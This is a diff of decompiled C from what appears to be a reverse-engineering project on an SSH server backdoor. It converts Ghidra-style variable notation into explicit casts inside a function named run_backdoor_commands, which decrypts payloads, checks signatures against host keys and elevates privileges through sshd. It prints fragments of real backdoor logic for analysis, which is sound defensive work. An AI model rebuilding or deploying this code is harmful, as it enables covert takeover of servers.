@@ -135,8 +135,8 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                (BVar16 = chacha_decrypt((u8 *)&data_s1,uVar14 - 0x10,(u8 *)&payload_size,
                                         (u8 *)&local_83,(u8 *)&data_s1,ctx->imported_funcs),
                BVar16 != FALSE)) {
-              local_550._0_8_ = 0;
-              local_550._8_8_ = (cmd_arguments_t *)0x0;
+              *(u64 *)local_550 = 0;
+              *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
               piVar21 = &payload_size;
               for (lVar23 = 0x39; lVar23 != 0; lVar23 = lVar23 + -1) {
                 *(u8 *)piVar21 = '\0';
@@ -158,7 +158,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
               if ((((psVar5 != (sensitive_data *)0x0) && (psVar5->host_pubkeys != (sshkey **)0x0))
                   && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar35 - 0x10)) {
                 iVar15 = (int)uVar27;
-                local_550._0_4_ = iVar15;
+                *(int *)local_550 = iVar15;
                 if (4 < uVar35 - 0x82) {
                   local_2e0[0] = (byte)num_n_bytes;
                   local_2e0[1] = (byte)((uint)num_n_bytes >> 8);
@@ -229,7 +229,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                     if (BVar16 != FALSE) {
                       lVar34 = 0;
                       do {
-                        signature._0_4_ = (uint)uVar20;
+                        *(uint *)&signature = (uint)uVar20;
                         uVar14 = (uint)lVar34;
                         if ((uint)signature <= uVar14) goto LAB_0010a112;
                         BVar16 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[lVar34],
@@ -336,7 +336,7 @@ LAB_00109d36:
                                                 }
                                                 if (BVar16 != FALSE) {
                                                   iVar15 = stack0xfffffffffffffa60;
-                                                  hostkey_hash_offset._0_1_ = 0;
+                                                  *(u8 *)&hostkey_hash_offset = 0;
                                                   _tmp = _tmp & 0xffffffff00000000;
                                                   local_590 = 0;
                                                   uStack_588 = 0;
@@ -433,17 +433,17 @@ LAB_00109d36:
                                                             (uint)local_2e0[3],ctx);
                                         if (BVar16 != FALSE) {
 LAB_0010a076:
-                                          local_590 = CONCAT71(local_590._1_7_,1);
-                                          local_550._8_8_ = (cmd_arguments_t *)0x0;
+                                          local_590 = CONCAT71((local_590 >> 8),1);
+                                          *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
                                           ppuVar31 = &extra_data;
                                           for (lVar23 = 0x3c; lVar23 != 0; lVar23 = lVar23 + -1) {
                                             *(undefined4 *)ppuVar31 = 0;
                                             ppuVar31 = (u8 **)((long)ppuVar31 +
                                                               (ulong)bVar37 * -8 + 4);
                                           }
-                                          local_550._0_8_ = 0x80;
-                                          body_offset._0_1_ = 8;
-                                          size._0_1_ = 1;
+                                          *(u64 *)local_550 = 0x80;
+                                          *(u8 *)&body_offset = 8;
+                                          *(u8 *)&size = 1;
                                           e = (*ctx->imported_funcs->BN_bin2bn)
                                                         ((uchar *)&local_590,1,(BIGNUM *)0x0);
                                           if (((e != (BIGNUM *)0x0) &&
@@ -498,8 +498,8 @@ LAB_00109fb9:
                                       else if ((((local_2e0[1] & 0xc0) == 0xc0) &&
                                                (plVar4->exit != (pfn_exit_t)0x0)) &&
                                               (plVar4->pselect != (pfn_pselect_t)0x0)) {
-                                        local_550._8_8_ = (cmd_arguments_t *)0x0;
-                                        local_550._0_8_ = 5;
+                                        *(cmd_arguments_t **)(local_550 + 8) = (cmd_arguments_t *)0x0;
+                                        *(u64 *)local_550 = 5;
                                         (*plVar4->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                            (fd_set *)0x0,(timespec *)local_550,
                                                            (sigset_t *)0x0);
@@ -513,11 +513,11 @@ LAB_00109fb9:
                                       *puVar32 = 0;
                                       puVar32 = puVar32 + (ulong)bVar37 * -2 + 1;
                                     }
-                                    local_550._8_8_ = local_2e0;
+                                    *(cmd_arguments_t **)(local_550 + 8) = local_2e0;
                                     extra_data = (u8 *)_tgt_uid;
                                     data_ptr2 = (u8 *)_tgt_gid;
                                     data_index = (u64)puVar29;
-                                    rsa_n_length._0_2_ = (short)uVar26;
+                                    *(u16 *)&rsa_n_length = (short)uVar26;
                                     _v = key;
                                     BVar16 = sshd_proxy_elevate((monitor_data_t *)local_550,ctx);
                                     if (BVar16 != FALSE) {
